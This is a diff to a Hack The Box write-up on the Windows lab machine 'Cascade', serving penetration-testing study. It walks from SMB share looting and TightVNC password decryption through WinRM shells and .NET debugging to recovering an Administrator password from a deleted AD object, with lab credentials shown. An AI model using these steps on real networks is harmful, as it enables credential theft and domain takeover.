@@ -9,7 +9,7 @@ menu:
     parent: htb-machines-windows
     weight: 10
 hero: images/cascade.png
-tags: ["HTB"]
+tags: ["HTB", "rpc", "ldap", "ldapsearch", "smb", "tightvnc", "msfconsole", "evil-winrm", "crackmapexec", "sqlite", "dnspy", "debug", "ad-recycle"]
 ---
 
 # Cascade
@@ -83,7 +83,7 @@ Unable to connect with SMB1 -- no workgroup available
 
 ```
 
-## Foothold
+## Foothold/User #1
 - `rpcclient`
   - https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration
 ```
@@ -207,7 +207,457 @@ cascadeLegacyPwd: clk0bjVldmE=
 └─$ echo "clk0bjVldmE=" | base64 -d                                             
 rY4n5eva 
 ```
-## User
 
+- Let's test the creds for `winrm`
+  - We only have access to `smb`
+```
+└─$ crackmapexec winrm 10.10.10.182 -u r.thompson -p rY4n5eva
+SMB         10.10.10.182    5985   CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)
+HTTP        10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
+WINRM       10.10.10.182    5985   CASC-DC1         [-] cascade.local\r.thompson:rY4n5eva
+```
+```
+└─$ crackmapexec smb 10.10.10.182 -u r.thompson -p rY4n5eva  
+SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
+
+```
+
+- `Data` share
+```
+└─$ smbclient  //10.10.10.182/Data -U 'r.thompson%rY4n5eva'   
+Try "help" to get a list of possible commands.
+smb: \> prompt off
+smb: \> recurce on
+recurce: command not found
+smb: \> recurse on
+smb: \> mget *
+NT_STATUS_ACCESS_DENIED listing \Contractors\*
+NT_STATUS_ACCESS_DENIED listing \Finance\*
+NT_STATUS_ACCESS_DENIED listing \Production\*
+NT_STATUS_ACCESS_DENIED listing \Temps\*
+getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as IT/Email Archives/Meeting_Notes_June_2018.html (4.8 KiloBytes/sec) (average 4.8 KiloBytes/sec)
+getting file \IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log of size 1303 as IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log (2.5 KiloBytes/sec) (average 3.7 KiloBytes/sec)
+getting file \IT\Logs\DCs\dcdiag.log of size 5967 as IT/Logs/DCs/dcdiag.log (7.9 KiloBytes/sec) (average 5.4 KiloBytes/sec)
+getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as IT/Temp/s.smith/VNC Install.reg (5.8 KiloBytes/sec) (average 5.5 KiloBytes/sec)
+smb: \> exit
+
+```
+
+- `Meeting_Notes_June_2018.html`
+
+![](./images/1.png)
+
+- `VNC Install.reg`
+```
+└─$ cat IT/Temp/s.smith/VNC\ Install.reg 
+Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
+"ExtraPorts"=""
+"QueryTimeout"=dword:0000001e
+"QueryAcceptOnTimeout"=dword:00000000
+"LocalInputPriorityTimeout"=dword:00000003
+"LocalInputPriority"=dword:00000000
+"BlockRemoteInput"=dword:00000000
+"BlockLocalInput"=dword:00000000
+"IpAccessControl"=""
+"RfbPort"=dword:0000170c
+"HttpPort"=dword:000016a8
+"DisconnectAction"=dword:00000000
+"AcceptRfbConnections"=dword:00000001
+"UseVncAuthentication"=dword:00000001
+"UseControlAuthentication"=dword:00000000
+"RepeatControlAuthentication"=dword:00000000
+"LoopbackOnly"=dword:00000000
+"AcceptHttpConnections"=dword:00000001
+"LogLevel"=dword:00000000
+"EnableFileTransfers"=dword:00000001
+"RemoveWallpaper"=dword:00000001
+"UseD3D"=dword:00000001
+"UseMirrorDriver"=dword:00000001
+"EnableUrlParams"=dword:00000001
+"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
+"AlwaysShared"=dword:00000000
+"NeverShared"=dword:00000000
+"DisconnectClients"=dword:00000001
+"PollingInterval"=dword:000003e8
+"AllowLoopback"=dword:00000000
+"VideoRecognitionInterval"=dword:00000bb8
+"GrabTransparentWindows"=dword:00000001
+"SaveLogToAllUsersPath"=dword:00000000
+"RunControlInterface"=dword:00000001
+"IdleTimeout"=dword:00000000
+"VideoClasses"=""
+"VideoRects"=""
+```
+- Let's crack the `Password`
+  - `6bcf2a4b6e5aca0f`
+  - I followed the following [post](https://github.com/frizb/PasswordDecrypts)
+```
+msf6 > irb
+[*] Starting IRB shell...
+[*] You are in the "framework" object
+
+irb: warn: can't alias jobs from irb_jobs.
+>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
+=> "\x17Rk\x06#NX\a"
+>> require 'rex/proto/rfb'
+=> true
+>> Rex::Proto::RFB::Cipher.decrypt ["6bcf2a4b6e5aca0f"].pack('H*'), fixedkey
+=> "sT333ve2"
+```
+
+- Test with `crackmapexec` 
+```
+└─$ crackmapexec winrm 10.10.10.182 -u s.smith -p sT333ve2
+SMB         10.10.10.182    5985   CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)
+HTTP        10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
+WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\s.smith:sT333ve2 (Pwn3d!)
+```
+
+- Let's get `winrm`
+
+![](./images/2.png)
+
+## User #2
+- `whoami`
+```
+*Evil-WinRM* PS C:\Users\s.smith\Documents> net user s.smith /domain
+User name                    s.smith
+Full Name                    Steve Smith
+Comment
+User's comment
+Country code                 000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/28/2020 8:58:05 PM
+Password expires             Never
+Password changeable          1/28/2020 8:58:05 PM
+Password required            Yes
+User may change password     No
+
+Workstations allowed         All
+Logon script                 MapAuditDrive.vbs
+User profile
+Home directory
+Last logon                   1/29/2020 12:26:39 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Audit Share          *IT
+                             *Remote Management Use
+Global Group memberships     *Domain Users
+The command completed successfully.
+
+```
+```
+*Evil-WinRM* PS C:\Users\s.smith\Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+```
+```
+*Evil-WinRM* PS C:\Users\s.smith\Documents> whoam /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                            Attributes
+=========================================== ================ ============================================== ===============================================================
+Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\Audit Share                         Alias            S-1-5-21-3332504370-1206983947-1165150453-1137 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+```
+- We have another user `arksvc`
+```
+*Evil-WinRM* PS C:\Users> ls
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        3/25/2020  11:17 AM                Administrator
+d-----        1/28/2020  11:37 PM                arksvc
+d-r---        7/14/2009   5:57 AM                Public
+d-----        1/15/2020  10:22 PM                s.smith
+```
+- Let's check `Audit Share` group
+```
+*Evil-WinRM* PS C:\Shares> net localgroup "Audit Share"
+Alias name     Audit Share
+Comment        \\Casc-DC1\Audit$
+
+Members
+
+-------------------------------------------------------------------------------
+s.smith
+The command completed successfully.
+```
+```
+*Evil-WinRM* PS C:\Shares> ls \\Casc-DC1\Audit$
+
+
+    Directory: \\Casc-DC1\Audit$
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        1/28/2020   9:40 PM                DB
+d-----        1/26/2020  10:25 PM                x64
+d-----        1/26/2020  10:25 PM                x86
+-a----        1/28/2020   9:46 PM          13312 CascAudit.exe
+-a----        1/29/2020   6:00 PM          12288 CascCrypto.dll
+-a----        1/28/2020  11:29 PM             45 RunAudit.bat
+-a----       10/27/2019   6:38 AM         363520 System.Data.SQLite.dll
+-a----       10/27/2019   6:38 AM         186880 System.Data.SQLite.EF6.dll
+```
+- Let's download it via `smb`
+```
+└─$ smbclient -U 's.smith%sT333ve2' //10.10.10.182/Audit$         
+Try "help" to get a list of possible commands.
+smb: \>  prompt OFF
+smb: \> recurse on
+smb: \> mget *
+getting file \CascAudit.exe of size 13312 as CascAudit.exe (22.8 KiloBytes/sec) (average 22.8 KiloBytes/sec)
+getting file \CascCrypto.dll of size 12288 as CascCrypto.dll (26.0 KiloBytes/sec) (average 24.2 KiloBytes/sec)
+getting file \RunAudit.bat of size 45 as RunAudit.bat (0.1 KiloBytes/sec) (average 14.7 KiloBytes/sec)
+getting file \System.Data.SQLite.dll of size 363520 as System.Data.SQLite.dll (135.8 KiloBytes/sec) (average 88.0 KiloBytes/sec)
+getting file \System.Data.SQLite.EF6.dll of size 186880 as System.Data.SQLite.EF6.dll (177.4 KiloBytes/sec) (average 105.2 KiloBytes/sec)
+getting file \DB\Audit.db of size 24576 as DB/Audit.db (51.4 KiloBytes/sec) (average 100.9 KiloBytes/sec)
+getting file \x64\SQLite.Interop.dll of size 1639936 as x64/SQLite.Interop.dll (400.5 KiloBytes/sec) (average 223.0 KiloBytes/sec)
+getting file \x86\SQLite.Interop.dll of size 1246720 as x86/SQLite.Interop.dll (557.2 KiloBytes/sec) (average 283.9 KiloBytes/sec)
+smb: \> 
+
+```
+- `DB/RunAudit.bat`
+```
+└─$ cat RunAudit.bat                    
+CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
+```
+- `Audit.db`
+```
+└─$ file Audit.db                                                                                                                                                
+Audit.db: SQLite 3.x database, last written using SQLite version 3027002, file counter 60, database pages 6, 1st free page 6, free pages 1, cookie 0x4b, schema 4, UTF-8, version-valid-for 60
+└─$ sqlite3 Audit.db 
+SQLite version 3.42.0 2023-05-16 12:36:15
+Enter ".help" for usage hints.
+sqlite> .tables
+DeletedUserAudit  Ldap              Misc            
+sqlite> select * from DeletedUserAudit;
+6|test|Test
+DEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d|CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
+7|deleted|deleted guy
+DEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef|CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local
+9|TempAdmin|TempAdmin
+DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a|CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local
+sqlite> select * from Ldap;
+1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
+sqlite> select * from Misc;
+sqlite> 
+```
+- `CascAudit.exe`
+```
+└─$ file CascAudit.exe
+CascAudit.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
+```
+- Let's analyse it with `dnspy`
+
+![](./images/3.png)
+
+![](./images/4.png)
+
+- We can `debug` it so it will decrypt the password for us
+
+![](./images/5.png)
+
+![](./images/6.png)
+
+- We have our creds 
+  - `arksvc:w3lc0meFr31nd`
+```
+└─$ crackmapexec winrm 10.10.10.182 -u arksvc -p w3lc0meFr31nd
+SMB         10.10.10.182    5985   CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)
+HTTP        10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
+WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\arksvc:w3lc0meFr31nd (Pwn3d!)
+
+```
+
+![](./images/7.png)
 
 ## Root
+- `whoami`
+```
+*Evil-WinRM* PS C:\Users\arksvc\Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+```
+```
+*Evil-WinRM* PS C:\Users\arksvc\Documents> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                            Attributes
+=========================================== ================ ============================================== ===============================================================
+Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+```
+- `AD Recycle Bin` - `enables users to recover deleted Active Directory objects without having to restore them from backup, restart Active Directory Domain Services or reboot domain controllers (DCs)`
+  - The [post](https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/)
+    - https://hideandsec.sh/books/red-teaming/page/domain-control-elevation#bkmrk-0x10-ad-recycle-bin
+    - Also https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#a-d-recycle-bin
+  - We can query it
+```
+*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
+
+
+Deleted           : True
+DistinguishedName : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
+Name              : CASC-WS1
+                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
+ObjectClass       : computer
+ObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe
+
+Deleted           : True
+DistinguishedName : CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local
+Name              : Scheduled Tasks
+                    DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
+ObjectClass       : group
+ObjectGUID        : 13375728-5ddb-4137-b8b8-b9041d1d3fd2
+
+Deleted           : True
+DistinguishedName : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
+Name              : {A403B701-A528-4685-A816-FDEE32BDDCBA}
+                    DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
+ObjectClass       : groupPolicyContainer
+ObjectGUID        : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
+
+Deleted           : True
+DistinguishedName : CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local
+Name              : Machine
+                    DEL:93c23674-e411-400b-bb9f-c0340bda5a34
+ObjectClass       : container
+ObjectGUID        : 93c23674-e411-400b-bb9f-c0340bda5a34
+
+Deleted           : True
+DistinguishedName : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local
+Name              : User
+                    DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
+ObjectClass       : container
+ObjectGUID        : 746385f2-e3a0-4252-b83a-5a206da0ed88
+
+Deleted           : True
+DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
+Name              : TempAdmin
+                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+ObjectClass       : user
+ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
+```
+- `TempAdmin` is interesting since we saw it in the `email` message
+  - It should have the same password as `Administrator`
+```
+*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property *
+
+
+accountExpires                  : 9223372036854775807
+badPasswordTime                 : 0
+badPwdCount                     : 0
+CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
+CN                              : TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+codePage                        : 0
+countryCode                     : 0
+Created                         : 1/27/2020 3:23:08 AM
+createTimeStamp                 : 1/27/2020 3:23:08 AM
+Deleted                         : True
+Description                     :
+DisplayName                     : TempAdmin
+DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
+dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
+givenName                       : TempAdmin
+instanceType                    : 4
+isDeleted                       : True
+LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
+lastLogoff                      : 0
+lastLogon                       : 0
+logonCount                      : 0
+Modified                        : 1/27/2020 3:24:34 AM
+modifyTimeStamp                 : 1/27/2020 3:24:34 AM
+msDS-LastKnownRDN               : TempAdmin
+Name                            : TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : user
+ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
+objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
+primaryGroupID                  : 513
+ProtectedFromAccidentalDeletion : False
+pwdLastSet                      : 132245689883479503
+sAMAccountName                  : TempAdmin
+sDRightsEffective               : 0
+userAccountControl              : 66048
+userPrincipalName               : TempAdmin@cascade.local
+uSNChanged                      : 237705
+uSNCreated                      : 237695
+whenChanged                     : 1/27/2020 3:24:34 AM
+whenCreated                     : 1/27/2020 3:23:08 AM
+```
+
+- The property `cascadeLegacyPwd` has a value
+  - Let's decrypt it
+```
+└─$ echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d    
+baCT3r1aN00dles 
+```
+
+- The password works for `Administrator`
+```
+└─$ crackmapexec winrm 10.10.10.182 -u administrator -p baCT3r1aN00dles
+SMB         10.10.10.182    5985   CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)
+HTTP        10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
+WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\administrator:baCT3r1aN00dles (Pwn3d!)
+```
+
+![](./images/8.png)
